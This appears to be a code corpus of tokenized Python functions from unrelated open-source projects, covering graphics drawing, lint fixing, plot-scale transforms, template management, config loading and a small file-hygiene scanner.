'iso-10646-ucs-4' , 'ucs-4' , 'csucs4' , 'utf-16' , 'utf-32' , 'utf_16' , 'utf_32' , 'utf16' , 'u16' ) ) : xml_encoding = sniffed_xml_encoding return xml_data , xml_encoding , sniffed_xml_encoding
def shoebot_example ( * * shoebot_kwargs ) : def decorator ( f ) : def run ( ) : from shoebot import ShoebotInstallError print ( "    Shoebot - %s:" % f . __name__ . replace ( "_" , " " ) ) try : import shoebot outputfile = "/tmp/shoebot-%s.png" % f . __name__ bot = shoebot . create_bot ( outputfile = outputfile ) f ( bot ) bot . finish ( ) print ( '        [passed] : %s' % outputfile ) print ( '' ) except ShoebotInstallError as e : print ( '        [failed]' , e . args [ 0 ] ) print ( '' ) except Exception : print ( '        [failed] - traceback:' ) for line in traceback . format_exc ( ) . splitlines ( ) : print ( '    %s' % line ) print ( '' ) return run return decorator
def _get_center ( self ) : x = ( self . x + self . width / 2 ) y = ( self . y + self . height / 2 ) return ( x , y )
def scale_context_and_center ( self , cr ) : bot_width , bot_height = self . bot_size if self . width != bot_width or self . height != bot_height : # Scale up by largest dimension if self . width < self . height : scale_x = float ( self . width ) / float ( bot_width ) scale_y = scale_x cr . translate ( 0 , ( self . height - ( bot_height * scale_y ) ) / 2.0 ) elif self . width > self . height : scale_y = float ( self . height ) / float ( bot_height ) scale_x = scale_y cr . translate ( ( self . width - ( bot_width * scale_x ) ) / 2.0 , 0 ) else : scale_x = 1.0 scale_y = 1.0 cr . scale ( scale_x , scale_y ) self . input_device . scale_x = scale_y self . input_device . scale_y = scale_y
def draw ( self , widget , cr ) : if self . bot_size is None : # No bot to draw yet. self . draw_default_image ( cr ) return cr = driver . ensure_pycairo_context ( cr ) surface = self . backing_store . surface cr . set_source_surface ( surface ) cr . paint ( )
def create_rcontext ( self , size , frame ) : if self . format == 'pdf' : surface = cairo . PDFSurface ( self . _output_file ( frame ) , * size ) elif self . format in ( 'ps' , 'eps' ) : surface = cairo . PSSurface ( self . _output_file ( frame ) , * size ) elif self . format == 'svg' : surface = cairo . SVGSurface ( self . _output_file ( frame ) , * size ) elif self . format == 'surface' : surface = self . target else : surface = cairo . ImageSurface ( cairo . FORMAT_ARGB32 , * size ) return cairo . Context ( surface )
def rendering_finished ( self , size , frame , cairo_ctx ) : surface = cairo_ctx . get_target ( ) if self . format == 'png' : surface . write_to_png ( self . _output_file ( frame ) ) surface . finish ( ) surface . flush ( )
def _parse ( self ) : p1 = "\[.*?\](.*?)\[\/.*?\]" p2 = "\[(.*?)\]" self . links = [ ] for p in ( p1 , p2 ) : for link in re . findall ( p , self . description ) : self . links . append ( link ) self . description = re . sub ( p , "\\1" , self . description ) self . description = self . description . strip ( )
def save_as ( self ) : chooser = ShoebotFileChooserDialog ( _ ( 'Save File' ) , None , Gtk . FileChooserAction . SAVE , ( Gtk . STOCK_SAVE , Gtk . ResponseType . ACCEPT , Gtk . STOCK_CANCEL , Gtk . ResponseType . CANCEL ) ) chooser . set_do_overwrite_confirmation ( True ) chooser . set_transient_for ( self ) saved = chooser . run ( ) == Gtk . ResponseType . ACCEPT if saved : old_filename = self . filename self . source_buffer . filename = chooser . get_filename ( ) if not self . save ( ) : self . filename = old_filename chooser . destroy ( ) return saved
def widget_changed ( self , widget , v ) : # set the appropriate bot var if v . type is NUMBER : self . bot . _namespace [ v . name ] = widget . get_value ( ) self . bot . _vars [ v . name ] . value = widget . get_value ( ) ## Not sure if this is how to do this - stu publish_event ( VARIABLE_UPDATED_EVENT , v ) # pretty dumb for now elif v . type is BOOLEAN : self . bot . _namespace [ v . name ] = widget . get_active ( ) self . bot . _vars [ v . name ] . value = widget . get_active ( ) ## Not sure if this is how to do this - stu publish_event ( VARIABLE_UPDATED_EVENT , v ) # pretty dumb for now elif v . type is TEXT : self . bot . _namespace [ v . name ] = widget . get_text ( ) self . bot . _vars [ v . name ] . value = widget . get_text ( ) ## Not sure if this is how to do this - stu publish_event ( VARIABLE_UPDATED_EVENT , v )
def parse ( svg , cached = False , _copy = True ) : if not cached : dom = parser . parseString ( svg ) paths = parse_node ( dom , [ ] ) else : id = _cache . id ( svg ) if not _cache . has_key ( id ) : dom = parser . parseString ( svg ) _cache . save ( id , parse_node ( dom , [ ] ) ) paths = _cache . load ( id , _copy ) return paths
def get_attribute ( element , attribute , default = 0 ) : a = element . getAttribute ( attribute ) if a == "" : return default return a
def copy ( self , graph ) : e = events ( graph , self . _ctx ) e . clicked = self . clicked return e
def drag ( self , node ) : dx = self . mouse . x - self . graph . x dy = self . mouse . y - self . graph . y # A dashed line indicates the drag vector. s = self . graph . styles . default self . _ctx . nofill ( ) self . _ctx . nostroke ( ) if s . stroke : self . _ctx . strokewidth ( s . strokewidth ) self . _ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . g , 0.75 ) p = self . _ctx . line ( node . x , node . y , dx , dy , draw = False ) try : p . _nsBezierPath . setLineDash_count_phase_ ( [ 2 , 4 ] , 2 , 50 ) except : pass self . _ctx . drawpath ( p ) r = node . __class__ ( None ) . r * 0.75 self . _ctx . oval ( dx - r / 2 , dy - r / 2 , r , r ) node . vx = dx / self . graph . d node . vy = dy / self . graph . d
def hover ( self , node ) : if self . popup == False : return if self . popup == True or self . popup . node != node : if self . popup_text . has_key ( node . id ) : texts = self . popup_text [ node . id ] else : texts = None self . popup = popup ( self . _ctx , node , texts ) self . popup . draw ( )
def textpath ( self , i ) : if len ( self . _textpaths ) == i : self . _ctx . font ( self . font , self . fontsize ) txt = self . q [ i ] if len ( self . q ) > 1 : # Indicate current text (e.g. 5/13). txt += " (" + str ( i + 1 ) + "/" + str ( len ( self . q ) ) + ")" p = self . _ctx . textpath ( txt , 0 , 0 , width = self . _w ) h = self . _ctx . textheight ( txt , width = self . _w ) self . _textpaths . append ( ( p , h ) ) return self . _textpaths [ i ]
def update ( self ) : if self . delay > 0 : # It takes a while for the popup to appear. self . delay -= 1 return if self . fi == 0 : # Only one text in queue, displayed infinitely. if len ( self . q ) == 1 : self . fn = float ( "inf" ) # Else, display time depends on text length. else : self . fn = len ( self . q [ self . i ] ) / self . speed self . fn = max ( self . fn , self . mf ) self . fi += 1 if self . fi > self . fn : # Rotate to the next text in queue. self . fi = 0 self . i = ( self . i + 1 ) % len ( self . q )
def draw ( self ) : if len ( self . q ) > 0 : self . update ( ) if self . delay == 0 : # Rounded rectangle in the given background color. p , h = self . textpath ( self . i ) f = self . fontsize self . _ctx . fill ( self . background ) self . _ctx . rect ( self . node . x + f * 1.0 , self . node . y + f * 0.5 , self . _w + f , h + f * 1.5 , roundness = 0.2 ) # Fade in/out the current text. alpha = 1.0 if self . fi < 5 : alpha = 0.2 * self . fi if self . fn - self . fi < 5 : alpha = 0.2 * ( self . fn - self . fi ) self . _ctx . fill ( self . text . r , self . text . g , self . text . b , self . text . a * alpha ) self . _ctx . translate ( self . node . x + f * 2.0 , self . node . y + f * 2.5 ) self . _ctx . drawpath ( p )
def merge_configs ( main , tweaks ) : for section in tweaks . sections ( ) : for option in tweaks . options ( section ) : value = tweaks . get ( section , option ) if option . endswith ( "+" ) : option = option [ : - 1 ] value = main . get ( section , option ) + value main . set ( section , option , value )
def usable_class_name ( node ) : name = node . qname ( ) for prefix in [ "__builtin__." , "builtins." , "." ] : if name . startswith ( prefix ) : name = name [ len ( prefix ) : ] return name
def parse_pylint_output ( pylint_output ) : for line in pylint_output : if not line . strip ( ) : continue if line [ 0 : 5 ] in ( "-" * 5 , "*" * 5 ) : continue parsed = PYLINT_PARSEABLE_REGEX . search ( line ) if parsed is None : LOG . warning ( u"Unable to parse %r. If this is a lint failure, please re-run pylint with the " u"--output-format=parseable option, otherwise, you can ignore this message." , line ) continue parsed_dict = parsed . groupdict ( ) parsed_dict [ 'linenum' ] = int ( parsed_dict [ 'linenum' ] ) yield PylintError ( * * parsed_dict )
def fix_pylint ( line , errors ) : if not errors : yield line return current = PYLINT_EXCEPTION_REGEX . search ( line ) if current : original_errors = { disable . strip ( ) for disable in current . group ( 'disables' ) . split ( ',' ) } else : original_errors = set ( ) disabled_errors = set ( original_errors ) for error in errors : if error . error_name == 'useless-suppression' : parsed = re . search ( """Useless suppression of '(?P<error_name>[^']+)'""" , error . error_msg ) disabled_errors . discard ( parsed . group ( 'error_name' ) ) elif error . error_name == 'missing-docstring' and error . error_msg == 'Missing module docstring' : yield format_pylint_disables ( { error . error_name } ) . strip ( ) + '\n' else : disabled_errors . add ( error . error_name ) disable_string = format_pylint_disables ( disabled_errors , not disabled_errors <= original_errors ) if current : yield PYLINT_EXCEPTION_REGEX . sub ( disable_string , line ) else : yield re . sub ( r'($\s*)' , disable_string + r'\1' , line , count = 1 )
def main ( argv = None ) : if argv is None : argv = sys . argv [ 1 : ] if not argv or argv [ 0 ] == "help" : show_help ( ) return 0 elif argv [ 0 ] == "check" : return check_main ( argv [ 1 : ] ) elif argv [ 0 ] == "list" : return list_main ( argv [ 1 : ] ) elif argv [ 0 ] == "write" : return write_main ( argv [ 1 : ] ) else : print ( u"Don't understand {!r}" . format ( " " . join ( argv ) ) ) show_help ( ) return 1
def show_help ( ) : print ( ) for cmd in [ write_main , check_main , list_main ] : print ( cmd . __doc__ . lstrip ( "\n" ) )
def transform ( x ) : try : x = date2num ( x ) except AttributeError : # numpy datetime64 # This is not ideal because the operations do not # preserve the np.datetime64 type. May be need # a datetime64_trans x = [ pd . Timestamp ( item ) for item in x ] x = date2num ( x ) return x
def transform ( x ) : # microseconds try : x = np . array ( [ _x . total_seconds ( ) * 10 ** 6 for _x in x ] ) except TypeError : x = x . total_seconds ( ) * 10 ** 6 return x
def inverse ( x ) : try : x = [ datetime . timedelta ( microseconds = i ) for i in x ] except TypeError : x = datetime . timedelta ( microseconds = x ) return x
def transform ( x ) : # nanoseconds try : x = np . array ( [ _x . value for _x in x ] ) except TypeError : x = x . value return x
def inverse ( x ) : try : x = [ pd . Timedelta ( int ( i ) ) for i in x ] except TypeError : x = pd . Timedelta ( int ( x ) ) return x
def _censor_with ( x , range , value = None ) : return [ val if range [ 0 ] <= val <= range [ 1 ] else value for val in x ]
def best_units ( self , sequence ) : # Read #   [(0.9, 's'), #    (9, 'm)] # as, break ranges between 0.9 seconds (inclusive) # and 9 minutes are represented in seconds. And so on. ts_range = self . value ( max ( sequence ) ) - self . value ( min ( sequence ) ) package = self . determine_package ( sequence [ 0 ] ) if package == 'pandas' : cuts = [ ( 0.9 , 'us' ) , ( 0.9 , 'ms' ) , ( 0.9 , 's' ) , ( 9 , 'm' ) , ( 6 , 'h' ) , ( 4 , 'd' ) , ( 4 , 'w' ) , ( 4 , 'M' ) , ( 3 , 'y' ) ] denomination = NANOSECONDS base_units = 'ns' else : cuts = [ ( 0.9 , 's' ) , ( 9 , 'm' ) , ( 6 , 'h' ) , ( 4 , 'd' ) , ( 4 , 'w' ) , ( 4 , 'M' ) , ( 3 , 'y' ) ] denomination = SECONDS base_units = 'ms' for size , units in reversed ( cuts ) : if ts_range >= size * denomination [ units ] : return units return base_units
def scaled_limits ( self ) : _min = self . limits [ 0 ] / self . factor _max = self . limits [ 1 ] / self . factor return _min , _max
def numeric_to_timedelta ( self , numerics ) : if self . package == 'pandas' : return [ self . type ( int ( x * self . factor ) , units = 'ns' ) for x in numerics ] else : return [ self . type ( seconds = x * self . factor ) for x in numerics ]
def round_any ( x , accuracy , f = np . round ) : if not hasattr ( x , 'dtype' ) : x = np . asarray ( x ) return f ( x / accuracy ) * accuracy
def nearest_int ( x ) : if x == 0 : return np . int64 ( 0 ) elif x > 0 : return np . int64 ( x + 0.5 ) else : return np . int64 ( x - 0.5 )
def _format ( formatter , x ) : # For MPL to play nice formatter . create_dummy_axis ( ) # For sensible decimal places formatter . set_locs ( [ val for val in x if ~ np . isnan ( val ) ] ) try : oom = int ( formatter . orderOfMagnitude ) except AttributeError : oom = 0 labels = [ formatter ( tick ) for tick in x ] # Remove unnecessary decimals pattern = re . compile ( r'\.0+$' ) for i , label in enumerate ( labels ) : match = pattern . search ( label ) if match : labels [ i ] = pattern . sub ( '' , label ) # MPL does not add the exponential component if oom : labels = [ '{}e{}' . format ( s , oom ) if s != '0' else s for s in labels ] return labels
def switch ( template , version ) : temple . update . update ( new_template = template , new_version = version )
def _in_git_repo ( ) : ret = temple . utils . shell ( 'git rev-parse' , stderr = subprocess . DEVNULL , check = False ) return ret . returncode == 0
def _has_branch ( branch ) : ret = temple . utils . shell ( 'git rev-parse --verify {}' . format ( branch ) , stderr = subprocess . DEVNULL , stdout = subprocess . DEVNULL , check = False ) return ret . returncode == 0
def not_has_branch ( branch ) : if _has_branch ( branch ) : msg = 'Cannot proceed while {} branch exists; remove and try again.' . format ( branch ) raise temple . exceptions . ExistingBranchError ( msg )
def has_env_vars ( * env_vars ) : for env_var in env_vars : if not os . environ . get ( env_var ) : msg = ( 'Must set {} environment variable. View docs for setting up environment at {}' ) . format ( env_var , temple . constants . TEMPLE_DOCS_URL ) raise temple . exceptions . InvalidEnvironmentError ( msg )
def is_temple_project ( ) : if not os . path . exists ( temple . constants . TEMPLE_CONFIG_FILE ) : msg = 'No {} file found in repository.' . format ( temple . constants . TEMPLE_CONFIG_FILE ) raise temple . exceptions . InvalidTempleProjectError ( msg )
def _get_current_branch ( ) : result = temple . utils . shell ( 'git rev-parse --abbrev-ref HEAD' , stdout = subprocess . PIPE ) return result . stdout . decode ( 'utf8' ) . strip ( )
def _apply_template ( template , target , * , checkout , extra_context ) : with tempfile . TemporaryDirectory ( ) as tempdir : repo_dir = cc_main . cookiecutter ( template , checkout = checkout , no_input = True , output_dir = tempdir , extra_context = extra_context ) for item in os . listdir ( repo_dir ) : src = os . path . join ( repo_dir , item ) dst = os . path . join ( target , item ) if os . path . isdir ( src ) : if os . path . exists ( dst ) : shutil . rmtree ( dst ) shutil . copytree ( src , dst ) else : if os . path . exists ( dst ) : os . remove ( dst ) shutil . copy2 ( src , dst )
def shell ( cmd , check = True , stdin = None , stdout = None , stderr = None ) : return subprocess . run ( cmd , shell = True , check = check , stdin = stdin , stdout = stdout , stderr = stderr )
def read_temple_config ( ) : with open ( temple . constants . TEMPLE_CONFIG_FILE ) as temple_config_file : return yaml . load ( temple_config_file , Loader = yaml . SafeLoader )
def write_temple_config ( temple_config , template , version ) : with open ( temple . constants . TEMPLE_CONFIG_FILE , 'w' ) as temple_config_file : versioned_config = { * * temple_config , * * { '_version' : version , '_template' : template } , } yaml . dump ( versioned_config , temple_config_file , Dumper = yaml . SafeDumper )
def set_cmd_env_var ( value ) : def func_decorator ( function ) : @ functools . wraps ( function ) def wrapper ( * args , * * kwargs ) : previous_cmd_env_var = os . getenv ( temple . constants . TEMPLE_ENV_VAR ) os . environ [ temple . constants . TEMPLE_ENV_VAR ] = value try : ret_val = function ( * args , * * kwargs ) finally : if previous_cmd_env_var is None : del os . environ [ temple . constants . TEMPLE_ENV_VAR ] else : os . environ [ temple . constants . TEMPLE_ENV_VAR ] = previous_cmd_env_var return ret_val return wrapper return func_decorator
def run ( self ) : filename = ".DS_Store" command = "find {path} -type f -name \"{filename}\" " . format ( path = self . path , filename = filename ) cmd = CommandHelper ( command ) cmd . execute ( ) files = cmd . output . split ( "\n" ) for f in files : if not f . endswith ( filename ) : continue # Ignore paths excluded rel_path = f . replace ( self . path , "" ) if rel_path . startswith ( tuple ( self . CONFIG [ 'exclude_paths' ] ) ) : continue issue = Issue ( ) issue . name = "File .DS_Store detected" issue . potential = False issue . severity = Issue . SEVERITY_LOW # Get only relative path issue . file = rel_path self . saveIssue ( issue )
def setup ( ) : # # Check if dir is writable # if not os.access(AtomShieldsScanner.HOME, os.W_OK): # 	AtomShieldsScanner.HOME = os.path.expanduser("~/.atomshields") # 	AtomShieldsScanner.CHECKERS_DIR = os.path.join(AtomShieldsScanner.HOME, "checkers") # 	AtomShieldsScanner.REPORTS_DIR = os.path.join(AtomShieldsScanner.HOME, "reports") if not os . path . isdir ( AtomShieldsScanner . CHECKERS_DIR ) : os . makedirs ( AtomShieldsScanner . CHECKERS_DIR ) if not os . path . isdir ( AtomShieldsScanner . REPORTS_DIR ) : os . makedirs ( AtomShieldsScanner . REPORTS_DIR ) # Copy all checkers for f in AtomShieldsScanner . _getFiles ( os . path . join ( os . path . dirname ( os . path . realpath ( __file__ ) ) , "checkers" ) , "*.py" ) : AtomShieldsScanner . installChecker ( f ) # Copy all reports for f in AtomShieldsScanner . _getFiles ( os . path . join ( os . path . dirname ( os . path . realpath ( __file__ ) ) , "reports" ) , "*.py" ) : AtomShieldsScanner . installReport ( f ) AtomShieldsScanner . _executeMassiveMethod ( path = AtomShieldsScanner . CHECKERS_DIR , method = "install" , args = { } ) config_dir = os . path . dirname ( AtomShieldsScanner . CONFIG_PATH ) if not os . path . isdir ( config_dir ) : os . makedirs ( config_dir )
def run ( self ) : self . checkProperties ( ) self . debug ( "[*] Iniciando escaneo de AtomShields con las siguientes propiedades. . . " ) self . showScanProperties ( ) self . loadConfig ( ) # Init time counter init_ts = datetime . now ( ) # Execute plugins cwd = os . getcwd ( ) os . chdir ( self . path ) issues = self . executeCheckers ( ) os . chdir ( cwd ) # Finish time counter end_ts = datetime . now ( ) duration = '{}' . format ( end_ts - init_ts ) # Process and set issues for plugin in issues . keys ( ) : value = issues [ plugin ] if isinstance ( value , list ) : map ( self . saveIssue , value ) else : self . saveIssue ( value ) # Execute reports print "" self . executeReports ( ) # Print summary output. self . debug ( "" ) self . debug ( "Duration: {t}" . format ( t = duration ) ) self . showSummary ( ) return self . issues
def install ( ) : cmd = CommandHelper ( ) cmd . install ( "npm" ) cmd = CommandHelper ( ) cmd . install ( "nodejs-legacy" ) # Install retre with npm cmd = CommandHelper ( ) cmd . command = "npm install -g retire" cmd . execute ( ) if cmd . errors : from termcolor import colored print colored ( cmd . errors , "red" ) else : print cmd . output
def load ( self , prefix = None , depth = None ) : prefix = prefix or self . prefix prefix = '/' + prefix . strip ( '/' ) + '/' if depth is None : depth = self . inherit_depth if not self . configured : log . debug ( "etcd not available" ) return if self . watching : log . info ( "Starting watcher for %r" , prefix ) self . start_watching ( ) log . info ( "Loading from etcd %r" , prefix ) try : result = self . client . get ( prefix ) except self . module . EtcdKeyNotFound : result = None if not result : log . info ( "No configuration found" ) return { } # Iterate over the returned keys from etcd update = { } for item in result . children : key = item . key value = item . value # Try to parse them as JSON strings, just in case it works try : value = pytool . json . from_json ( value ) except : pass # Make the key lower-case if we're not case-sensitive if not self . case_sensitive : key = key . lower ( ) # Strip off the prefix that we're using if key . startswith ( prefix ) : key = key [ len ( prefix ) : ] # Store the key/value to update the config update [ key ] = value # Access cached settings directly to avoid recursion inherited = Config ( ) . settings . get ( self . inherit_key , update . get ( self . inherit_key , None ) ) if depth > 0 and inherited : log . info ( "    ... inheriting ..." ) inherited = self . load ( inherited , depth - 1 ) or { } inherited . update ( update ) update = inherited return update
def get_watcher ( self ) : if not self . watching : raise StopIteration ( ) return self . client . eternal_watch ( self . prefix , recursive = True )
def start_watching ( self ) : # Don't create a new watcher thread if we already have one running if self . watcher and self . watcher . is_alive ( ) : return # Create a new watcher thread and start it self . watcher = Watcher ( ) self . watcher . start ( )
def main ( ) : parser = argparse . ArgumentParser ( description = "Helper for working with " "pyconfigs" ) target_group = parser . add_mutually_exclusive_group ( ) target_group . add_argument ( '-f' , '--filename' , help = "parse an individual file or directory" , metavar = 'F' ) target_group . add_argument ( '-m' , '--module' , help = "parse a package or module, recursively looking inside it" , metavar = 'M' ) parser . add_argument ( '-v' , '--view-call' , help = "show the actual pyconfig call made (default: show namespace)" , action = 'store_true' ) parser . add_argument ( '-l' , '--load-configs' , help = "query the currently set value for each key found" , action = 'store_true' ) key_group = parser . add_mutually_exclusive_group ( ) key_group . add_argument ( '-a' , '--all' , help = "show keys which don't have defaults set" , action = 'store_true' ) key_group . add_argument ( '-k' , '--only-keys' , help = "show a list of discovered keys without values" , action = 'store_true' ) parser . add_argument ( '-n' , '--natural-sort' , help = "sort by filename and line (default: alphabetical by key)" , action = 'store_true' ) parser . add_argument ( '-s' , '--source' , help = "show source annotations (implies --natural-sort)" , action = 'store_true' ) parser . add_argument ( '-c' , '--color' , help = "toggle output colors (default: %s)" % bool ( pygments ) , action = 'store_const' , default = bool ( pygments ) , const = ( not bool ( pygments ) ) ) args = parser . parse_args ( ) if args . color and not pygments : _error ( "Pygments is required for color output.\n" "    pip install pygments" ) if args . module : _handle_module ( args ) if args . filename : _handle_file ( args )
def _handle_module ( args ) : module = _get_module_filename ( args . module ) if not module : _error ( "Could not load module or package: %r" , args . module ) elif isinstance ( module , Unparseable ) : _error ( "Could not determine module source: %r" , args . module ) _parse_and_output ( module , args )
def _colorize ( output ) : if not pygments : return output # Available styles # ['monokai', 'manni', 'rrt', 'perldoc', 'borland', 'colorful', 'default', # 'murphy', 'vs', 'trac', 'tango', 'fruity', 'autumn', 'bw', 'emacs', # 'vim', 'pastie', 'friendly', 'native'] return pygments . highlight ( output , pygments . lexers . PythonLexer ( ) , pygments . formatters . Terminal256Formatter ( style = 'monokai' ) )
def _map_arg ( arg ) : # Grab the easy to parse values if isinstance ( arg , _ast . Str ) : return repr ( arg . s ) elif isinstance ( arg , _ast . Num ) : return arg . n elif isinstance ( arg , _ast . Name ) : name = arg . id if name == 'True' : return True elif name == 'False' : return False elif name == 'None' : return None return name else : # Everything else we don't bother with return Unparseable ( )
def as_call ( self ) : default = self . _default ( ) default = ', ' + default if default else '' return "pyconfig.%s(%r%s)" % ( self . method , self . get_key ( ) , default )
def get_key ( self ) : if not isinstance ( self . key , Unparseable ) : return self . key line = self . source [ self . col_offset : ] regex = re . compile ( '''pyconfig\.[eginst]+\(([^,]+).*?\)''' ) match = regex . match ( line ) if not match : return Unparseable ( ) return "<%s>" % match . group ( 1 )
def _default_value_only ( self ) : line = self . source [ self . col_offset : ] regex = re . compile ( '''pyconfig\.[eginst]+\(['"][^)]+?['"], ?(.*?)\)''' ) match = regex . match ( line ) if not match : return '' return match . group ( 1 )
def _default ( self ) : try : # Check if it's iterable iter ( self . default ) except TypeError : return repr ( self . default ) # This is to look for unparsable values, and if we find one, we try to # directly parse the string for v in self . default : if isinstance ( v , Unparseable ) : default = self . _default_value_only ( ) if default : return default # Otherwise just make it a string and go return ', ' . join ( str ( v ) for v in self . default )
def _get_param_names ( self ) : template = Template ( self . yaml_string ) names = [ 'yaml_string' ] # always include the template for match in re . finditer ( template . pattern , template . template ) : name = match . group ( 'named' ) or match . group ( 'braced' ) assert name is not None names . append ( name ) return names
def load ( self ) : from pylearn2 . config import yaml_parse from pylearn2 . datasets import Dataset dataset = yaml_parse . load ( self . yaml_string ) assert isinstance ( dataset , Dataset ) data = dataset . iterator ( mode = 'sequential' , num_batches = 1 , data_specs = dataset . data_specs , return_tuple = True ) . next ( ) if len ( data ) == 2 : X , y = data y = np . squeeze ( y ) if self . one_hot : y = np . argmax ( y , axis = 1 ) else : X = data y = None return X , y
def _create_kernel ( self ) : # Check kernels kernels = self . kernel_params if not isinstance ( kernels , list ) : raise RuntimeError ( 'Must provide enumeration of kernels' ) for kernel in kernels : if sorted ( list ( kernel . keys ( ) ) ) != [ 'name' , 'options' , 'params' ] : raise RuntimeError ( 'strategy/params/kernels must contain keys: "name", "options", "params"' ) # Turn into entry points. # TODO use eval to allow user to specify internal variables for kernels (e.g. V) in config file. kernels = [ ] for kern in self . kernel_params : params = kern [ 'params' ] options = kern [ 'options' ] name = kern [ 'name' ] kernel_ep = load_entry_point ( name , 'strategy/params/kernels' ) if issubclass ( kernel_ep , KERNEL_BASE_CLASS ) : if options [ 'independent' ] : # TODO Catch errors here?  Estimator entry points don't catch instantiation errors kernel = np . sum ( [ kernel_ep ( 1 , active_dims = [ i ] , * * params ) for i in range ( self . n_dims ) ] ) else : kernel = kernel_ep ( self . n_dims , * * params ) if not isinstance ( kernel , KERNEL_BASE_CLASS ) : raise RuntimeError ( 'strategy/params/kernel must load a' 'GPy derived Kernel' ) kernels . append ( kernel ) self . kernel = np . sum ( kernels )
def _assert_all_finite ( X ) : X = np . asanyarray ( X ) # First try an O(n) time, O(1) space solution for the common case that # everything is finite; fall back to O(n) space np.isfinite to prevent # false positives from overflow in sum method if ( X . dtype . char in np . typecodes [ 'AllFloat' ] and not np . isfinite ( X . sum ( ) ) and not np . isfinite ( X ) . all ( ) ) : raise ValueError ( "Input contains NaN, infinity" " or a value too large for %r." % X . dtype )
def _warn_if_not_finite ( X ) : X = np . asanyarray ( X ) # First try an O(n) time, O(1) space solution for the common case that # everything is finite; fall back to O(n) space np.isfinite to prevent # false positives from overflow in sum method if ( X . dtype . char in np . typecodes [ 'AllFloat' ] and not np . isfinite ( X . sum ( ) ) and not np . isfinite ( X ) . all ( ) ) : warnings . warn ( "Result contains NaN, infinity" " or a value too large for %r." % X . dtype , category = UserWarning )
def num_samples ( x , is_nested = False ) : if hasattr ( x , 'fit' ) : # Don't get num_samples from an ensembles length! raise TypeError ( 'Expected sequence or array-like, got ' 'estimator %s' % x ) if is_nested : return sum ( num_samples ( xx , is_nested = False ) for xx in x ) if not hasattr ( x , '__len__' ) and not hasattr ( x , 'shape' ) : if hasattr ( x , '__array__' ) : x = np . asarray ( x ) else : raise TypeError ( "Expected sequence or array-like, got %s" % type ( x ) ) if hasattr ( x , 'shape' ) : if len ( x . shape ) == 0 : raise TypeError ( "Singleton array %r cannot be considered" " a valid collection." % x ) return x . shape [ 0 ] else : return len ( x )
def fromdict ( cls , config , check_fields = True ) : m = super ( Config , cls ) . __new__ ( cls ) m . path = '.' m . verbose = False m . config = m . _merge_defaults ( config ) if check_fields : m . _check_fields ( ) return m
def sha1 ( self ) : with open ( self . path , 'rb' ) as f : return hashlib . sha1 ( f . read ( ) ) . hexdigest ( )
def plot_3 ( data , ss , * args ) : if len ( data ) <= 1 : warnings . warn ( "Only one datapoint. Could not compute t-SNE embedding." ) return None scores = np . array ( [ d [ 'mean_test_score' ] for d in data ] ) # maps each parameters to a vector of floats warped = np . array ( [ ss . point_to_unit ( d [ 'parameters' ] ) for d in data ] ) # Embed into 2 dimensions with t-SNE X = TSNE ( n_components = 2 ) . fit_transform ( warped ) e_scores = np . exp ( scores ) mine , maxe = np . min ( e_scores ) , np . max ( e_scores ) color = ( e_scores - mine ) / ( maxe - mine ) mapped_colors = list ( map ( rgb2hex , cm . get_cmap ( 'RdBu_r' ) ( color ) ) ) p = bk . figure ( title = 't-SNE (unsupervised)' , tools = TOOLS ) df_params = nonconstant_parameters ( data ) df_params [ 'score' ] = scores df_params [ 'x' ] = X [ : , 0 ] df_params [ 'y' ] = X [ : , 1 ] df_params [ 'color' ] = mapped_colors df_params [ 'radius' ] = 1 p . circle ( x = 'x' , y = 'y' , color = 'color' , radius = 'radius' , source = ColumnDataSource ( data = df_params ) , fill_alpha = 0.6 , line_color = None ) cp = p hover = cp . select ( dict ( type = HoverTool ) ) format_tt = [ ( s , '@%s' % s ) for s in df_params . columns ] hover . tooltips = OrderedDict ( [ ( "index" , "$index" ) ] + format_tt ) xax , yax = p . axis xax . axis_label = 't-SNE coord 1' yax . axis_label = 't-SNE coord 2' return p
def plot_4 ( data , * args ) : params = nonconstant_parameters ( data ) scores = np . array ( [ d [ 'mean_test_score' ] for d in data ] ) order = np . argsort ( scores ) for key in params . keys ( ) : if params [ key ] . dtype == np . dtype ( 'bool' ) : params [ key ] = params [ key ] . astype ( np . int ) p_list = [ ] for key in params . keys ( ) : x = params [ key ] [ order ] y = scores [ order ] params = params . loc [ order ] try : radius = ( np . max ( x ) - np . min ( x ) ) / 100.0 except : print ( "error making plot4 for '%s'" % key ) continue p_list . append ( build_scatter_tooltip ( x = x , y = y , radius = radius , add_line = False , tt = params , xlabel = key , title = 'Score vs %s' % key ) ) return p_list
def get_ip_packet ( data , client_port , server_port , is_loopback = False ) : header = _loopback if is_loopback else _ethernet try : header . unpack ( data ) except Exception as ex : raise ValueError ( 'Bad header: %s' % ex ) tcp_p = getattr ( header . data , 'data' , None ) if type ( tcp_p ) != dpkt . tcp . TCP : raise ValueError ( 'Not a TCP packet' ) if tcp_p . dport == server_port : if client_port != 0 and tcp_p . sport != client_port : raise ValueError ( 'Request from different client' ) elif tcp_p . sport == server_port : if client_port != 0 and tcp_p . dport != client_port : raise ValueError ( 'Reply for different client' ) else : raise ValueError ( 'Packet not for/from client/server' ) return header . data
def report ( self ) : self . _output . write ( '\r' ) sort_by = 'avg' results = { } for key , latencies in self . _latencies_by_method . items ( ) : result = { } result [ 'count' ] = len ( latencies ) result [ 'avg' ] = sum ( latencies ) / len ( latencies ) result [ 'min' ] = min ( latencies ) result [ 'max' ] = max ( latencies ) latencies = sorted ( latencies ) result [ 'p90' ] = percentile ( latencies , 0.90 ) result [ 'p95' ] = percentile ( latencies , 0.95 ) result [ 'p99' ] = percentile ( latencies , 0.99 ) result [ 'p999' ] = percentile ( latencies , 0.999 ) results [ key ] = result headers = [ 'method' , 'count' , 'avg' , 'min' , 'max' , 'p90' , 'p95' , 'p99' , 'p999' ] data = [ ] results = sorted ( results . items ( ) , key = lambda it : it [ 1 ] [ sort_by ] , reverse = True ) def row ( key , res ) : data = [ key ] + [ res [ header ] for header in headers [ 1 : ] ] return tuple ( data ) data = [ row ( key , result ) for key , result in results ] self . _output . write ( '%s\n' % tabulate ( data , headers = headers ) ) self . _output . flush ( )
def of_structs ( cls , a , b ) : t_diff = ThriftDiff ( a , b ) t_diff . _do_diff ( ) return t_diff
